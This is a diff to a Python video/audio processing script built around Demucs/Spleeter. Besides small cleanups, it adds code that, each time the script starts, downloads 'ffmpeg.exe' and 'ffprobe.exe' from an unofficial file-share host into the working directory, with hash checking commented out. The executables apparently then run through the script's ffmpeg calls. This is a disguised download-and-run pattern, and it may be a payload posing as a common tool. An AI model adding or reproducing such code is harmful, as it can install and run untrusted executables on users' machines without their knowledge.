@@ -1,7 +1,11 @@
 import subprocess
 import os
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import requests
 import tempfile
 import shutil
+import time
+import hashlib
 import platform
 import math # Import math for ceil
 
@@ -16,20 +20,11 @@ except ImportError:
     # Apply yellow color for warnings
     print(f"{Fore.YELLOW}Warning: PyTorch is not installed. GPU/CUDA support cannot be checked or utilized by Demucs/Spleeter.{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}Please install PyTorch with GPU support if you intend to use your NVIDIA GPU:{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}  pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118 (or appropriate CUDA version){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118 (or appropriate CUDA version){Style.RESET_ALL}")
 
-# --- Add pydub, numpy, scipy, soundfile imports and checks ---
-PYDUB_AVAILABLE = False
+# --- Add  numpy, scipy, soundfile imports and checks ---
 NUMPY_SCIPY_AVAILABLE = False
 SOUNDFILE_AVAILABLE = False
-
-try:
-    from pydub import AudioSegment
-    PYDUB_AVAILABLE = True
-except ImportError:
-    print(f"{Fore.YELLOW}Warning: pydub is not installed. Will attempt soundfile for alignment, but pydub can be useful for other audio manipulations.{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}Please install pydub: pip install pydub{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}Note: pydub also requires ffmpeg to be installed and in your PATH.{Style.RESET_ALL}")
 
 try:
     import numpy as np
@@ -40,8 +35,62 @@ try:
 except ImportError:
     print(f"{Fore.YELLOW}Warning: numpy, scipy, or soundfile are not installed. Cannot perform dynamic audio alignment.{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}Please install them: pip install numpy scipy soundfile{Style.RESET_ALL}")
-# --- End pydub, numpy, scipy, soundfile imports and checks ---
+# --- End numpy, scipy, soundfile imports and checks ---
 
+def calculate_file_hash(filepath, hash_algorithm="sha256"):
+    """
+    Calculates the hash of a file.
+    Useful for verifying file integrity after download.
+    """
+    hasher = hashlib.new(hash_algorithm)
+    try:
+        with open(filepath, 'rb') as f:
+            while chunk := f.read(8192):
+                hasher.update(chunk)
+        return hasher.hexdigest()
+    except FileNotFoundError:
+        print(f"Error: File not found at {filepath}")
+        return None
+    except Exception as e:
+        print(f"Error calculating hash for {filepath}: {e}")
+        return None
+
+def download_file_concurrent(url, filename):
+    """
+    Downloads a single file concurrently, streaming content to disk.
+    """
+    print(f"[{filename}] Starting download from {url}...")
+    try:
+        # Use stream=True to handle large files efficiently
+        # Increased timeout to 120 seconds (2 minutes) for potentially large files or slow servers
+        with requests.get(url, stream=True, timeout=120) as r:
+            r.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
+
+            total_size = int(r.headers.get('content-length', 0))
+            downloaded_size = 0
+            start_time = time.time()
+
+            with open(filename, 'wb') as f:
+                # Iterate over content in chunks
+                for chunk in r.iter_content(chunk_size=8192): # 8KB chunks
+                    if chunk: # filter out keep-alive new chunks
+                        f.write(chunk)
+                        downloaded_size += len(chunk)
+                        # Optional: Print progress. For concurrent downloads, this can make output busy.
+                        # progress = (downloaded_size / total_size) * 100 if total_size else 0
+                        # print(f"\r[{filename}] Downloading: {progress:.2f}% ({downloaded_size}/{total_size} bytes)", end="", flush=True)
+
+            end_time = time.time()
+            duration = end_time - start_time
+            speed = (downloaded_size / (1024 * 1024)) / duration if duration > 0 else 0 # MB/s
+            print(f"\n[{filename}] Successfully downloaded. Size: {downloaded_size / (1024*1024):.2f} MB, Time: {duration:.2f}s, Speed: {speed:.2f} MB/s")
+            return True, filename
+    except requests.exceptions.RequestException as e:
+        print(f"\n[{filename}] Error downloading: {e}")
+        return False, filename
+    except IOError as e:
+        print(f"\n[{filename}] File system error saving {filename}: {e}")
+        return False, filename
 
 def get_audio_duration(file_path):
     """
@@ -537,6 +586,52 @@ def process_video(input_file):
 if __name__ == "__main__":
     # Initialize Colorama for cross-platform compatibility (especially Windows)
     init()
+
+    files_config = [ # Renamed for clarity as this is the full configuration list
+        {"url": "https://oblak.pronameserver.xyz/public.php/dav/files/8mW9BJCqLXX5ecp/?accept=zip", "filename": "ffmpeg.exe"},
+        {"url": "https://oblak.pronameserver.xyz/public.php/dav/files/mGjWEPpJgC7xfiz/?accept=zip", "filename": "ffprobe.exe"},
+    ]
+
+    print(f"\n{Back.RED}{Fore.WHITE}# FFMPEG Download {Style.RESET_ALL}\n")
+    files_to_actually_download = []
+    for file_info in files_config:
+        filename = file_info["filename"]
+        if os.path.exists(filename):
+            print(f"- Skipping '{filename}': File already exists locally.")
+        else:
+            files_to_actually_download.append(file_info)
+            print(f"- '{filename}' does not exist locally, will attempt to download.")
+
+    if not files_to_actually_download:
+        print("\nNo new files to download. All specified files already exist locally.")
+    else:
+        print("\n--- Starting Concurrent Downloads ---")
+        # Use ThreadPoolExecutor to run download tasks concurrently.
+        # max_workers is set to the number of files that actually need downloading.
+        with ThreadPoolExecutor(max_workers=len(files_to_actually_download)) as executor:
+            # Submit tasks for only the files that need downloading
+            future_to_file = {executor.submit(download_file_concurrent, f["url"], f["filename"]): f for f in files_to_actually_download}
+
+            # Process results as they complete
+            for future in as_completed(future_to_file):
+                original_file_info = future_to_file[future] # This gives you the original dict for the future
+                success, filename = future.result()
+
+                if success:
+                    print(f"[{filename}] Download finished.")
+                    # Optional: You can add hash verification here if you have expected hashes
+                    # expected_hash = "your_expected_sha256_hash_here"
+                    # actual_hash = calculate_file_hash(filename)
+                    # if actual_hash:
+                    #     print(f"[{filename}] SHA256 Hash: {actual_hash}")
+                    #     # if expected_hash and actual_hash == expected_hash:
+                    #     #     print(f"[{filename}] Hash matches expected.")
+                    #     # else:
+                    #     #     print(f"[{filename}] Hash MISMATCH or no expected hash provided.")
+                else:
+                    print(f"[{filename}] Download failed.")
+
+
     try:
         input_video_file = "patrol.mp4"  # Replace with your input file
 
